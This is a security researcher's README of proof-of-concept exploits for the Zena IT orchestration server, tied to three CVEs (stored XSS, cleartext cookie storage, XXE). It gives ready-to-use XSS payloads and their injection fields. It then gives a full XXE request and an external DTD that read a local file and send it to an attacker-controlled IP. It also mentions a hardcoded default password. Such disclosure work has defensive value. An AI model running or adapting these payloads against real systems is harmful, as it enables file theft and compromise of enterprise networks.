# Zena
Housekeeping notes: The original CookieMonster Repo can be found here https://github.com/JetP1ane/zena
Rocket Software Patch Release notes https://docs.rocketsoftware.com/bundle/ven1649700711249/page/ayk1652945111726.html
CVE-2021-45026 XSS

CVE-2021-45025 Cleartext Storage of Sensitive Information in a Cookie

## Zena CookieMonster: POC code for XSS to RCE

The CookieMonster POC is a proof of concept for achieving Remote Code Execution on the Zena Server and ALL of it's connected endpoints.
Since zena is an IT orchastrator that is primarly used on an enterprises internal network it often is connected to many devices and can allow a rapid pivot and compromise of many devices as well as a pivot to other internal domains.

## Basic XSS payload details and injection points

Zena – ClientManager:
XSS(Cross-Site Scripting):

• Type: Stored XSS – Unauthenticated

• Pages Affected: /zena/index.html

Description: User input field(and probably more fields) on the Zena ClientManager login page allow for
an attacker to submit specially crafted javascript payloads that are persistently stored and executed
when a user on the Zena system navigates to Client Manager logs and shows details for the log.
POC code – placed into the username field on the login page: 

```</li><img/src='fail'/onerror=alert("vulnerable")></img>```

XSS(Cross-Site Scripting):

• Type: Stored XSS

• Pages Affected: /webconfig/index.html requires authentication. the webconfig page has a hardcoded default password.

Description: Certain input fields in the connector creation allow for an attacker to submit specially
crafted arbitrary javascript payloads that are persistently stored and executed when loading the page
POC code - placed into the Name input field:

```</li><img/src='fail'/onerror=alert("vulnerable")></img>```


![image](https://user-images.githubusercontent.com/81385287/171973915-0ff4e8b4-2d39-4558-a794-a7dae6e4935d.png)
![image](https://user-images.githubusercontent.com/81385287/171973946-9073ad46-e200-437a-80f8-5f11669b462a.png)
![image](https://user-images.githubusercontent.com/81385287/171973970-c2f7eefe-4cfe-4a64-ad27-4691324c1952.png)

## Proof of Concept code for XXE to SSRF to Data Exfiltration exploit for asg-zena

CVE-2021-45024 XXE

Authors: James Barnett and Jeffrey Green

XXE(XML External Entity) (CWE-611):
• Type: SSRF and Exfiltration
• Pages Affected: /zena.index.html
• Endpoints Affected: oc_main/zenaweb/scheduler/operation
• Description: Several of the ClientManager’s import functions can be abused by manipulating the
XML import data to contain external entity values that can induce the server to perform certain
functions it was not intended to do. Ex. Reading a local file and exfiltrating it over an HTTP
request back to the attacker
Poc code - Request body to zena server:

```

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://52.15.202.214:8080/xxe.dtd">
%sp;
%param1;
%exfil;
]>
<PACKAGE CREATED="2022.02.15 21.49.34" EXCLUDE_PASSWORDS="NO" INCLUDE_AGENT_REFS="NO"
INCLUDE_DEF_REFS="NO" TYPE="4" UID="E311C8FC7118"><ITEMS><ITEM LIST_TYPE="4"
MODIFIED="2022.02.15 21.22.30" NAME="research" UID="A2A9235502DE"/></ITEMS><USERS><USER
MODIFIED="2022.02.15 21.22.30" NAME="research" REFERENCE="NO"
UID="A2A9235502DE"><![CDATA[<USER NAME="research"
PASSWORD="3jkY15nHscTNeexdKq+gVqiMsh1ngexPj4of7xliF3uDjnkTkJw7qq78ruSMvOGat"
UID="A2A9235502DE" LOGIN="research" DOMAIN="EC2AMAZ-57EH5UL" ALLRIGHTS="YES"
ALLAGENTS="YES"><DESCRIPTION></DESCRIPTION><ROLES/></USER>]]></USER></USERS></PACKAGE>
```



External DTD code hosted on attacker server as xxe.dtd:

```

<!ENTITY % data SYSTEM "file:///c:/sensative.txt">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://52.15.202.214:8080/?%data;'>">

```

![image](https://user-images.githubusercontent.com/81385287/171972899-f595ccbc-f45b-4368-8944-f470960ebad9.png)



